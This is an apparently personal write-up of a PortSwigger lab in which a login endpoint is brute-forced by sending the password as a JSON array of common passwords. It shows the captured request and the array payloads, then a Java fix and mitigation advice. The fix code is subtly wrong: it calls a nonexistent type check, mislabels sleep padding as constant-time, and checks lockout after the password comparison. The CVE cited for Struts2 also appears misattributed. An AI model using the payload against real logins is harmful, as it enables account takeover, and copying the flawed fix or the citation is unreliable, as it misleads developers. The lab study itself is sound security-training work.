## Lab: Broken brute-force protection, multiple credentials per request
**Goal:** Show understanding of authentication bypass through input type confusion, 
and how inadequate input validation defeats security controls.

## Lab Details
Lab: Broken brute-force protection, multiple credentials per request

Level: Practitioner

Vulnerability Class: Broken Authentication — Input Type Confusion / Rate-Limit Bypass

Lab URL: [PortSwigger Academy link](https://portswigger.net/web-security/authentication/password-based/lab-broken-brute-force-protection-multiple-credentials-per-request)

Date Completed: 21-Sep-2026

Time to Solve: 2 hours

## Vulnerability Summary
The login endpoint accepts username and password via JSON, but fails to validate 
that the password field is a string. By submitting an array of candidate passwords 
instead, an attacker can test multiple credentials in a single request, bypassing 
brute-force protection mechanisms (rate limiting, account lockout, delayed responses). 
This transforms a vulnerability that should require hundreds of sequential requests 
into a single parallel attack.

## Reconnaissance
**Initial Observation:** Sent credentials via POST /login and observed the response 
structure is JSON. Noticed the response is a 302 redirect (success indicator).

**Critical Question:** How does the server handle unexpected input types?

**Testing Process:**
- Tested invalid credentials → likely 401/403 (failure — assumed based on normal auth flow)
- Hypothesis: Server deserializes JSON without type checking; if password is an array, 
  what happens?

## Exploitation — Step by Step

### Step 1: Capture and Examine the Login Request
Sent login credentials normally and captured the request in Burp Suite Repeater 
to understand the JSON structure.

Request example:
```json
POST /login HTTP/1.1
Content-Type: application/json

{
  "username": "carlos",
  "password": "wrongpassword"
}
```

rate limiting in the immediate response headers.

### Step 2: Modify Password Field to Array
[What you did]
Instead of a single string for password, submitted an array of candidate passwords.

```json
{
  "username": "carlos",
  "password": [
    "123456",
    "password",
    "qwerty",
    "123456789",
    "12345678"
  ]
}
```

Server returned 302 redirect, indicating successful authentication. The server 
processed the array and authenticated if ANY password in the array matched the 
user's actual password.

### Step 3: Verify Authentication
[What you did]
Followed the 302 redirect (or accessed the /my-account page) to confirm successful 
session establishment.

Successfully authenticated as the target user without triggering any brute-force 
protection mechanisms.

### Key Payload(s)

```json
{
  "username": "carlos",
  "password": [
    "123456",
    "password",
    "qwerty",
    "123456789",
    "12345678",
    "123123",
    "1q2w3e4r",
    "abc123"
  ]
}
```

**What the server expected vs. what it received:**
- Expected: `password` (string) → validated against stored hash
- Received: `password` (array) → server either accepted first element, iterated 
  through array in auth logic, or failed to sanitize input type

### Tools Used
- Manual (Burp Suite Repeater)

---

## **The Fix**

### Backend Validation (Critical)
```java
// Spring Boot Controller — Input validation + type safety

@PostMapping("/login")
public ResponseEntity<?> login(@RequestBody LoginRequest request) {
    // 1. Validate input types strictly
    if (request.getPassword() == null || !request.getPassword().isString()) {
        return ResponseEntity.badRequest()
            .body("Invalid request format");
    }
    
    // 2. Sanitize input
    String username = request.getUsername().trim();
    String password = request.getPassword().trim();
    
    if (username.isEmpty() || password.isEmpty()) {
        return ResponseEntity.status(401).body("Invalid credentials");
    }
    
    // 3. Use parameterized queries (if DB lookup is involved)
    User user = userRepository.findByUsername(username);
    
    // 4. Check password with bcrypt/scrypt (never plain text)
    if (user == null || !passwordEncoder.matches(password, user.getPasswordHash())) {
        // Intentional timing consistency (prevent timing attacks)
        Thread.sleep(100 + random(50)); // constant-time auth
        return ResponseEntity.status(401).body("Invalid credentials");
    }
    
    // 5. Check rate limiting
    if (loginAttemptService.isBlocked(username)) {
        return ResponseEntity.status(429).body("Too many attempts. Try again later.");
    }
    
    // Proceed with authentication...
}
```

### Additional Mitigations:

**Input Deserialization:**
- Use a strongly-typed DTO that enforces string fields. Jackson (Java) will reject 
  arrays if the field is defined as `String`, not `List<String>`.

**Rate Limiting:**
- Implement per-username rate limiting (e.g., Redis-backed sliding window)
- Lock account after 5 failed attempts for 15 minutes
- Log all failed attempts for monitoring

**Account Lockout Policy:**
- Temporary lockout on N failed attempts
- Exponential backoff (first lockout 5 min, then 15 min, then 1 hour)

**Constant-Time Comparison:**
- Use `MessageDigest.isEqual()` or bcrypt's built-in timing-safe comparison
- Prevents timing attacks that leak password length or character positions

**Error Handling:**
- Never expose whether username exists or password is wrong
- Return generic "Invalid credentials" for both cases

---

## **What I Found Interesting / Unexpected**

The elegance of this vulnerability lies in **type confusion at the deserialization layer.** 
Most developers think about brute-force protection in terms of rate limiting (requests/second), 
but they often overlook that the application code itself must validate what *type* of data it's processing.

This mirrors a broader pattern: **trust in the wrong layer.** The developer likely assumed:
- "The login endpoint will receive a string for password"
- "Rate limiting will catch rapid requests"

But neither assumption addresses input validation at the type level. It's a reminder that security requires defense in depth—one control (rate limiting) isn't enough if input validation fails upstream.

---

## **Real-World Relevance**

This technique mirrors authentication bypass patterns seen in multiple high-impact disclosures:

1. **Struts2 REST Plugin (CVE-2017-5645):** Type confusion in deserialization allowed 
   attackers to inject arbitrary objects, leading to RCE.

**Real-world impact:** An attacker with a candidate password list (from a breach or wordlist) 
can test hundreds of passwords against a target account *without triggering rate limiting*, 
making account takeover trivially easy.

---

## **Connections to My Own Projects**

---

## **Developer & AppSec Takeaway**

> **Never assume the structure of incoming data—validate the type, not just the value.** 
> Type confusion is a common root cause of authentication bypasses. Use strongly-typed 
> data models (DTOs, schemas) and test authentication with malformed JSON (arrays, 
> null values, nested objects) to catch these issues before production. Additionally, 
> rate limiting should be implemented at the application logic level, not just HTTP headers.